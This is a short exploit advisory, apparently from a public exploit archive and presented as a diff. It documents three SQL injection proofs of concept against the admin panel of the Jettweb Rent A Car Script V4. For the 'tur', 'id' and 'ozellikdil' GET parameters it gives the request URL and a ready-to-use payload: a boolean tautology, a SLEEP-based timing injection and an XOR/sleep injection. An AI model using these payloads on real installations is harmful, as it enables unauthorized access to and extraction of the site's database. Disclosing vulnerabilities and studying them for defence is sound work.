@@ -1,0 +1,29 @@
+# Exploit Title: Jettweb Hazır Rent A Car Scripti V4 - SQL Injection
+# Date: 26.03.2019
+# Exploit Author: Ahmet Ümit BAYRAM
+# Vendor Homepage: https://jettweb.net/u-46-php-hazir-rent-a-car-scripti-v4.html
+# Demo Site: http://rentv4.proemlaksitesi.net/
+# Version: V4
+# Tested on: Kali Linux
+# CVE: N/A
+
+----- PoC 1: SQLi -----
+
+Request:
+http://localhost/[PATH]/admin/index.php?admin=vitestipi&tur=VitesTipi
+Vulnerable Parameter: tur (GET)
+Payload: admin=vitestipi&tur=VitesTipi' AND 2211=2211 AND 'fVeE'='fVeE
+
+
+----- PoC 2: SQLi -----
+
+Request: http://localhost/[PATH]/admin/index.php?admin=rez-gor&id=2
+Vulnerable Parameter: id (GET)
+Payload: admin=rez-gor&id=2 AND SLEEP(5)
+
+----- PoC 3: SQLi -----
+
+Request: http://localhost/[PATH]/admin/index.php
+Vulnerable Parameter: ozellikdil (GET)
+Payload:
+admin=ozellikekle&itemid=1&ozellikdil=0'XOR(if(now()=sysdate()%2Csleep(0)%2C0))XOR'Z&syf=ceviriguncelle&tur=VitesTipi
